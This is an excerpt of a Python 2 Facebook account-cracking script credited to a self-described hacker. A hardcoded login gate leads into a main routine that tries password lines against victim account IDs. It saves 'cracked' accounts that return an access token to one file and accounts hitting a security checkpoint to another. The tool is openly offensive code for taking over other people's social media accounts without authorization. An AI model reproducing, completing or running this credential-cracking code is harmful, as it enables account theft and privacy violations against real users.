...
{rcl}[+] This Script From Abir Whate Hate hacker...
...
if Permission=="On":
  ...
  motion(ccl+"Abir-Hacker11's Permission")
  time.sleep(2)
...
while True:
    ...
    motion(warn)
    Usr= raw_input(bcl+"Enter Username =>>Abir")
    if Usr==User:
        motion(gcl+"\nCorrect User\n")
        psd= raw_input(ycl+"Enter Password =>>Hacker")
        if psd == Pwd:
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        motion (ccl+'\n[ABIR_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/ABIR_Successful.txt', 'a')
        okb.write(victim +" [ ABIR ] "+ line + '\n')
        okb.close()
        motion(ccl+"\nCreacked Account In Save File...\n")       
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[ABIR_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/ABIR_CheckPoint.txt', 'a')
        cps.write(victim +" [ ABIR ] "+ line + '\n')
        cps.close()
        motion(ccl+"\nCreacked Account In Save File...\n")
